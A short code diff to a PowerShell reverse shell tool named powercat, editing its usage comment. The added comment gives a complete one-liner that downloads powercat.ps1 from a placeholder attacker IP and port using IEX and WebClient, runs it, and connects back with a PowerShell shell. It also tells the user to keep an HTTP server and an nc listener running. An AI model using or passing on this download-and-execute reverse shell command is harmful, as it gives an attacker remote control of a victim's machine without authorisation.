@@ -20,7 +20,9 @@ function powercat
     [alias("GenerateEncoded")][switch]$ge=$False,
     [alias("Help")][switch]$h=$False
   )
-  # Usage: IEX(New-Object System.Net.WebClient).DownloadString('http://${ATTACKER_IP/powercat.ps1');powercat -c ${ATTACKER_IP} -p ${ATTACKER_PORT} -e powershell
+  # Usage: IEX(New-Object System.Net.WebClient).DownloadString('http://${ATTACKER_IP}:${ATTACKER_HTTP_PORT}/powercat.ps1');powercat -c ${ATTACKER_IP} -p ${ATTACKER_PORT} -e powershell
+  # Make sure to have a http server up and running on ${ATTACKER_HTTP_PORT} and an nc listener on $ATTACKER_PORT
+  # The reason for this is that the above string is shorter than the alternative.
   
   ############### HELP ###############
   $Help = "
